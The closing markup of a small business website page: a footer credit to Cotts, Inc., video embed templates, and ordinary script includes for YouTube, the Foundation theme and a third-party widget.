</div></div><div id='stacks_out_112_42' class='stacks_out'><div id='stacks_in_112_42' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div> </div>  
<div  class="sgw-developer" style=""> <div id='stacks_out_112_8' class='stacks_out'><div id='stacks_in_112_8' class='stacks_in com_joeworkman_stacks_foundation_footertext_stack'><p class="copyright text-right ">  Site Design: <a href="https://cottsinc.com">&copy; 2018 Cotts, Inc Digital Marketing | </a> </p> 
</div></div> </div>  
 </div> </div> 
</div></div></div></div></div></div> <!-- JSON values description embed id likes service timestamp title type url views images.thumb.width images.thumb.height images.thumb.url images.full.width images.full.height images.full.url --> <script type="text/template" id="socialitem"> <div class="video" data-likes="&#123;&#123;likes&#125;&#125;" data-timestamp="&#123;&#123;timestamp&#125;&#125;" data-title="&#123;&#123;title&#125;&#125;" data-service="&#123;&#123;service&#125;&#125;"> <div class="play-wrapper"> <img src="&#123;&#123;images.thumb.url&#125;&#125;" alt="&#123;&#123;title&#125;&#125;" width="&#123;&#123;images.thumb.width&#125;&#125;" height="	&#123;&#123;images.thumb.height&#125;&#125;"/> <div class="play-button"><div class="play">&#9650;</div></div> </div> <figcaption class="title">&#123;&#123;title&#125;&#125;</figcaption> </div> </script> <script type="text/template" id="boxembed"> <div class="embed &#123;&#123;service&#125;&#125;">&#123;&#123;&#123;embed&#125;&#125;&#125;</div> <div class="caption"> <h3 class="title">&#123;&#123;title&#125;&#125;</h3> <p class="description">&#123;&#123;&#123;description&#125;&#125;&#125;</p> </div> <div class="dock"> <button class="dock-close" aria-label="close">&#215;</button> <button class="dock-bottom dock-toggle" aria-label="dock bottom">&darr;</button> <button class="dock-top dock-toggle" aria-label="dock bottom">&uarr;</button> <button class="dock-redock" aria-label="redock">&#8857;</button> </div> </script> 
<!--  --><!--  -->




 <script src="//www.youtube.com/iframe_api"></script> 



<script data-cfasync="true" src="../rw_common/themes/foundation/foundation.min.js"></script>


<script src="../rw_common/assets/global.js"></script>
<script src="https://website-widgets.pages.dev/dist/sienna.min.js" defer></script></body>
</html>
